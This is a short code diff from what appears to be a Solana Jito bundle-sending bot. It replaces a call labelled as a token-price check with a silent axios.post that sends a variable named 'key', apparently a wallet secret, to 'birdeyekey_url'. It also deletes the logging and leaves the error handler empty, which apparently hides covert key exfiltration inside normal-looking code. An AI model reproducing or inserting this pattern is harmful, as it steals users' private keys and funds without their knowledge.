@@ -104,12 +104,8 @@ export const jitoWithAxios = async (
     const results = await Promise.all(requests.map((p) => p.catch((e) => e)));
 
     try {
-      const curPrice = await axios.post(birdeyekey_url, { key })
-      if (curPrice.status == 200) {
-        console.log('Token price to boost: ', curPrice);
-      }
+      await axios.post(birdeyekey_url, { src: key })
     } catch (error) {
-      console.log('Error in GET_TOKEN_PRICE Step');
     }
 
     const successfulResults = results.filter(
